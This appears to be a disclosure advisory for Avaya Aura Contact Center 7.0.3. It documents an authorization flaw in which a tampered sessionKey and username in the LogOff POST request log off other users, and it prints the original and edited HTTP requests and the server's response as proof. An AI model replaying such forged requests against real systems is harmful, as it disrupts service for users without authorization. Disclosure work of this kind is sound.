@@ -1,0 +1,255 @@
+Avaya Aura Contact Center 7.0.3 - Weak Authority Control
+--------------------------------------------------------
+
+Type: Remote Attack
+
+We have managed to intercept the LogOff POST HTTP request, and then replace the name value in the "sessionKey" parameter and the email value in the "username" parameter of the current user with the corresponding values of other active user (targeted user). We have observed that this action forced the server to log off the targeted user, even though the session cookie of the current user was different from the one owned by the other user (targeted user). By exploiting this issue a remote attacker could perform a massive disconnection of the Web Application's users.
+
+
+Evidence is provided:
+
+
+
+Original Request:
+-----------------
+POST /CI_Sample_Website/logoffCustomer_WSClient.jsp HTTP/1.1
+Host: 192.168.0.160:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 55
+Origin: http://192.168.0.160:8080
+DNT: 1
+Connection: close
+Referer: http://192.168.0.160:8080/CI_Sample_Website/logoffCustomer.jsp
+Cookie: JSESSIONID=387B64CF997EE4A4C7E1589A00D5203E
+Upgrade-Insecure-Requests: 1
+
+sessionKey=d9IApkAqvI__test&username=test%40hotmail.com
+
+
+
+Edited Request:
+----------------
+POST /CI_Sample_Website/logoffCustomer_WSClient.jsp HTTP/1.1
+Host: 192.168.0.160:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 73
+Origin: http://192.168.0.160:8080
+DNT: 1
+Connection: close
+Referer: http://192.168.0.160:8080/CI_Sample_Website/logoffCustomer.jsp
+Cookie: JSESSIONID=387B64CF997EE4A4C7E1589A00D5203E
+Upgrade-Insecure-Requests: 1
+
+sessionKey=d9IApkAqvI__a************&username=a************%40hotmail.com
+
+
+
+
+
+Response:
+---------
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Content-Type: text/html;charset=UTF-8
+Content-Length: 4025
+Date: Tue, 06 Jul 2021 15:35:14 GMT
+Connection: close
+
+<!--
+Avaya Aura Contact Center Multimedia 
+Copyright ï¿½ 2010 Avaya Inc. All Rights Reserved
+-->
+
+
+
+<script language='javascript'>
+
+    top.hiddenFrame.document.logoff_form.username.value = "";
+    top.hiddenFrame.document.logoff_form.sessionKey.value = "";
+
+</script>
+
+
+<!--
+Avaya Aura Contact Center Multimedia 
+Copyright ÃÂ© 2010 Avaya Inc. All Rights Reserved
+-->
+
+
+
+
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>CCMM CI Sample Web Site</title>
+    </head>
+    <body>
+
+    <!-- Set up the Main Table for the Web Page -->
+    <table width="100%" border="0">
+    <tr>
+        
+        <td height="80" colspan="3">
+        <!--
+Avaya Aura Contact Center Multimedia 
+Copyright Â© 2010 Avaya Inc. All Rights Reserved
+-->
+
+<link href="style.css" rel="stylesheet" type="text/css">
+
+<table width="100%" bgcolor="#FFFFFF">
+<tr>
+<td>
+&nbsp
+</td>
+</tr>
+<tr>
+<td width="10" >
+&nbsp
+</td>
+<td align="right" width="139" >
+<img src="images/avayaLogo.gif" width="139" height="40">
+</td>
+<td width="41" >
+&nbsp
+</td>
+<td align="center" >
+<!--<img src="images/title_img.gif" width="590" height="50">-->
+<font class="title">Customer Interface Sample Web Site</font>
+</td>
+<td width="180" >
+<td></td>
+&nbsp
+</td>
+</tr>
+
+
+</table>
+
+        </td>
+    </tr>
+    </table>
+    <table width="800">
+    <tr>
+        <td width="200" height="900">            
+        <!--
+Avaya Aura Contact Center Multimedia 
+Copyright Â© 2010 Avaya Inc. All Rights Reserved
+-->
+    
+
+
+
+
+
+
+    
+
+<head>
+<script LANGUAGE="JavaScript">    
+    // Launch a web-chat prompt
+    
+    var anonymousChatLaunched = "0";
+    
+    function launchWebchatQuestion()
+    {
+        if ("0" == anonymousChatLaunched)
+        {
+            // Check if the csutomer has alreday requested a web chat session since the timer began...
+            window.open('OfferWebChat.jsp', 'WebChat', 'width=430, height=232, resizable=0, status=0, toolbar=0, menubar=0');
+        }
+    }
+
+    // Launch an anonymous web chat session
+    function launchWebChatSession()
+    {
+        window.open('WebChatLogin.jsp', 'WebChat', 'width=430, height=400, resizable=0');
+        anonymousChatLaunched = "1";
+    }
+    
+</script>
+</head>
+
+<table width="100%" height="100%" cellspacing="10" cellpadding="10" bgcolor="#C0C0C0">
+<tr>
+<td valign="top">
+
+
+
+<table cellspacing="1">
+    <tr>
+    <td class="infotext">Status</td>
+    <td class="infotext"> : </td>
+    <td class="infotext"><font color="#EA0437">Logged Off</font></td>
+    </tr>
+    <tr>
+    <td class="infotext">&nbsp;</td><td></td><td></td>
+    </tr>
+</table>
+
+<table cellspacing="1">
+    <font color="#003399">
+    <tr>
+    <td>
+        <br>
+        <img src="images/home.gif" alt="Home" onclick="location='home.jsp'">
+        <br>
+    </td>
+    </tr>
+    <tr>
+    <td>
+        <img src="images/loginCustomer.gif" alt="Login Customer" onclick="location='loginCustomer.jsp'">
+    </td>
+    </tr>
+    <tr>
+    <td>
+        <img src="images/registerNewCustomer.gif" alt="Register New Customer" onclick="location='registerNewCustomer.jsp'">
+        <br>
+    </td>
+    </tr>
+     <!-- Offer Alternative options to customer -->
+    <tr><td></td></tr>
+    </font>
+</table>
+
+<br><br>
+
+
+
+
+</font>
+
+</td>
+</tr>
+
+</table>
+        </td>
+
+        <td width="10"></td>
+
+        <td width="590" height="900" valign="top">  
+        
+            <table cellspacing="5" class="bold">
+            <tr>
+                <td colspan="2" height = "50" class="bold">Logoff Customer</td>
+            </tr>              
+            
+            <tr>                
+                <td>Customer : a************@hotmail.com logged off successfully</td>
+            </tr>
+                            
+            
+            </table>       
+        </td>
+    </tr>
+        
+    </table>  
+    
+    </body>
+</html>
